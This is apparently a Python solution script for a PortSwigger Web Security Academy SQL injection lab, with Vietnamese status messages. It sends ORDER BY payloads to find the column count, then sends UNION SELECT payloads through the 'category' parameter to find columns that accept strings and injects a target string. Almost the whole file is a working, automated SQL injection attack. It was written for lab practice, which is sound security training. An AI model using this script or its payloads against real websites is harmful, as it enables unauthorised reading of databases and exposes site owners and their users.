import requests
from bs4 import BeautifulSoup
import re
host="0ab60069047b6392803c6cfb00720066.web-security-academy.net"
base_url=f"https://{host}/filter?category="
headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
}

res_get_string=requests.get(base_url+"Gifts",headers=headers)
soup=BeautifulSoup(res_get_string.text,"html.parser")
hint_element = soup.find('p', id='hint')
if hint_element:
    full_text = hint_element.text
    print(f"Toàn bộ nội dung: {full_text}")
    match = re.search(r"'([^']+)'", full_text)
    if match:
        target_string = match.group(1)
        print(f"[+] Chuỗi mục tiêu : {target_string}")

def find_column_count():
    print("[*] Đang xác định số lượng cột bằng ORDER BY...")
    for i in range(1,21):
        payload=f"' ORDER BY {i} -- -"
        res=requests.get(base_url+payload,headers=headers)
        if res.status_code !=200:
            column_count=i-1
            print(f"[+] Thành công! Số lượng cột là: {column_count}")
            return column_count        
    return 0

num_cols = find_column_count()
def find_string_column():
    print(f"[*] Đang kiểm tra lần lượt {num_cols} cột...")
    valid_indices = []
    test_str = f"'{target_string}'"
    for i in range(num_cols):
        payload_list = ["NULL"] * num_cols
        payload_list[i] = test_str
        payload = "' UNION SELECT " + ", ".join(payload_list) + " -- -"
        res = requests.get(base_url + payload, headers=headers)
        if res.status_code == 200:
            print(f"[+] Cột {i+1}: Hỗ trợ String")
            valid_indices.append(i)
        else:
            print(f"[-] Cột {i+1}: Không hỗ trợ")
    return valid_indices

string_cols = find_string_column()
final_list=["NULL"]*num_cols

for _ in string_cols:
    final_list[_]='abc'

payload="' UNION SELECT "+", ".join(final_list)+" -- -"
res=requests.get(base_url+payload,headers=headers)

print(res.status_code)
print(res.text)



